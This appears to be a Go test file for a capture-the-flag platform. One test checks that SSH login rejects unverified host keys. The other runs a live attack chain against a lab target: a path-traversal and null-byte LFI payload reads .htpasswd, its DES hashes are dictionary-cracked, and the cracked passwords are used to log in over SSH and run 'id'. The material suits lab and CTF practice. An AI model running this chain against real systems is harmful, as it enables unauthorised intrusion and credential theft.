package ctfplatform

import (
	"context"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"
)

func TestTrySSHLogin_RequiresExplicitInsecure(t *testing.T) {
	// 自签主机密钥必须显式放行，否则直接拒绝——避免默认不校验主机密钥
	if _, err := TrySSHLogin(context.Background(), "127.0.0.1:1", "u", "p", false, time.Second); err == nil {
		t.Fatal("allowInsecureHostKey=false 时应返回错误")
	} else if !strings.Contains(err.Error(), "insecure") {
		t.Errorf("错误信息应说明 insecure 原因，实际: %v", err)
	}
}

// TestLiveSSHChain 跑完整杀伤链：LFI 取 .htpasswd → 破解 → SSH 登录 → `id` 证明权限。
//
// 需要同时设三个环境变量，否则 SKIP（默认不联网、不耗时）：
//
//	CTF4_LAB_URL=http://127.0.0.1:8080/
//	CTF4_WORDLIST=D:/tmp_gotest/words.txt
//	CTF4_SSH_ADDR=127.0.0.1:2222
//
//	go test -run TestLiveSSHChain -v -timeout 1800s ./internal/ctfplatform/
//
// 说明：字典 10 万词 × 变形约需 2~3 分钟；口令明文只在内存中传递，不写日志、不入库。
func TestLiveSSHChain(t *testing.T) {
	base := os.Getenv("CTF4_LAB_URL")
	dictPath := os.Getenv("CTF4_WORDLIST")
	sshAddr := os.Getenv("CTF4_SSH_ADDR")
	if base == "" || dictPath == "" || sshAddr == "" {
		t.Skip("缺 CTF4_LAB_URL / CTF4_WORDLIST / CTF4_SSH_ADDR，跳过")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Second)
	defer cancel()

	// 1. LFI 读 .htpasswd
	cl := webClient(8 * time.Second)
	_, body, _, err := webFetch(ctx, cl, strings.TrimSuffix(base, "/")+"/?page=../restricted/.htpasswd%00")
	if err != nil {
		t.Fatalf("读取 .htpasswd 失败: %v", err)
	}
	reLine := regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:[A-Za-z0-9./]{13}$`)
	entries := ParseHtpasswd(strings.Join(reLine.FindAllString(string(body), 50), "\n"))
	if len(entries) == 0 {
		t.Fatalf("未解析出 DES 条目")
	}

	// 2. 破解
	words, err := LoadWordlist(dictPath)
	if err != nil {
		t.Fatalf("读字典失败: %v", err)
	}
	users := make([]string, 0, len(entries))
	for _, e := range entries {
		users = append(users, e.User)
	}
	words = append(words, BuiltinWordlist(users)...)

	start := time.Now()
	cracked := CrackHtpasswdBatched(entries, words, true, 20000, 0)
	t.Logf("[crack] elapsed=%v 破解成功=%d/%d", time.Since(start).Round(time.Second), len(cracked), len(entries))
	if len(cracked) == 0 {
		t.Skip("字典未覆盖任何口令——属正常结果，不算失败")
	}

	// 3. SSH 登录 + 权限证明
	for _, c := range cracked {
		acc, err := TrySSHLogin(ctx, sshAddr, c.User, c.Password, true, 15*time.Second)
		if err != nil {
			t.Logf("[ssh] %s 登录失败: %v", c.User, err)
			continue
		}
		t.Logf("[ssh] %s 登录成功 addr=%s", acc.User, acc.Addr)
		t.Logf("[ssh] id=%s", acc.WhoAmI)
		t.Logf("[ssh] hostname=%s", acc.Hostname)
		if !strings.Contains(acc.WhoAmI, "uid=") {
			t.Errorf("`id` 输出异常: %q", acc.WhoAmI)
		}
		return // 一条成功即证明链条打通
	}
	t.Fatalf("破解到 %d 条口令但均未能登录", len(cracked))
}
